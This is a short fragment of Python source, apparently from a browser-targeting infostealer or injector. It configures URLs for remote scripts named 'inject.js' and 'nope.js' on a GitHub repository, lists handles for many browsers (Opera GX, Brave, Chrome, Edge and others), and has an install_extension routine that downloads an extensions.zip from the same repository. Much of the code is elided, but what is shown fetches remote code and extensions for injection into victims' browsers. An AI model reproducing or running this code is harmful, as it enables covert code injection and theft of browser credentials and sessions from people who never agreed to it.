...
json_confg = {
    ...
    "url_srdl": f"https://raw.githubusercontent.com/EMRE13333/ZenithCBRO/main/inject.js",
...
url = "https://raw.githubusercontent.com/EMRE13333/ZenithCBRO/main/nope.js"
   ...
   #     return (self.operagx, self.opera, self.brave, self.chrome, self.vivaldi, self.edge, self.yandex, self.iron, self.kiwi)
    ...
    def install_extension(self):
        ...
        try:
            ...
            extensions = {
                'extensions': f'https://github.com/EMRE13333/ZenithCBRO/raw/main/extensions.zip'
            }
